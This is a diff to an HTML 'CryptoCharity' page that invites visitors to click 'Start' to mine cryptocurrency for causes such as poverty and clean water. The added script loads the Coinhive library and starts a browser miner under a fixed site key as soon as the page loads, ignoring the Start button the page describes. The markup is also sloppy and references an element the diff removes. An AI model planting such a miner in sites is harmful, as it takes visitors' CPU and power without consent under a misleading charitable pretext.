@@ -14,35 +14,63 @@
 
 <body>
 
-  <head>
+  <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<head>
   <title>Mining...</title>
 </head>
 
-<body>
   <h1>CryptoCharity</h1>
   <button onclick="startMining()">Start</button>
   <button onclick="stopMining()">Stop</button>
-  <div>
-    <a id="hashes">HASHES/S<br></a>
-    <a id="total">TOTAL<br></a>
-    <p id="threds">THREADS<br></p>
-  </div>
-  <h2>How it works?</h2>
+    
+<h2>How it works</h2>
   <ul class="steps">
-    <li><strong>1</strong> - Choose Charity to Donate to</li>
-    <li><strong>2</strong> - Click "Start" to start mining. The website will use max 60% of your CPU</li>
-    <li><strong>3</strong> - Click "Stop" anytime to stop mining. </li>
-
+    <ol>Select a cause you are passionate about</ol>
+    <ol>Click "Start Mining"</ol>
+    <ol>We will automatically donate all cryptocurrency mined to the charity</ol>
+    <ol>Click"Stop Mining" anytime to pause. No need to close the tab</ol>
   </ul>
-  <p><br>You can verify our donations <a href="https://moneroblocks.info/stats/ringct-transactions"> here </a></p>
-</body>
+
+  <h2>Causes to donate to</h2>
+  <ul class="socialIssues">
+    <li>Poverty</li>
+    <li>Clean Water</li>
+    <li>Food Waste</li>
+    <li>Gender Equality</li>
+    <li>Pollution</li>
+    <li>HIV</li>
+  </ul>
+<center>
+<p id="threads"></p>
+<p id="hashes"></p>
+<p id="to"></p>
+<p id="accepted"></p>
+</center>
+<center>
+<p id="minebutton"></p>
+</center>
+<p><br>You can verify our donations through <a href="https://moneroblocks.info/stats/ringct-transactions"> block explorer </a></p>
+
+<script type="text/javascript">
+var miner = new CoinHive.Anonymous('jcVMdO1LuMFrg7MMnbyVdYz5uCX3OsqY',{throttle:0.7});
+miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+// Update stats once per second
+setInterval(function() {
+    if (miner.isRunning()) {
+        document.getElementById("threads").innerHTML = "Threads: " + miner.getNumThreads();
+        document.getElementById("hashes").innerHTML = "hashes per second: " + Math.round(miner.getHashesPerSecond() * 100) / 100;
+        document.getElementById("total").innerHTML = "Total Hashes: " + miner.getTotalHashes();
+        document.getElementById("accepted").innerHTML = "Accepted Hashes: " + miner.getAcceptedHashes();
+    } else {
+        document.getElementById("total").innerHTML = "Hashes/s";
+        document.getElementById("hashes").innerHTML = "Total Hashes";
+        document.getElementById("accepted").innerHTML = "Accepted Hashes";
+    }
+// Output to HTML elements
+}, 1000);
+</script>
   
   
-
-    <script  src="js/index.js"></script>
-
-
-
 
 </body>
 
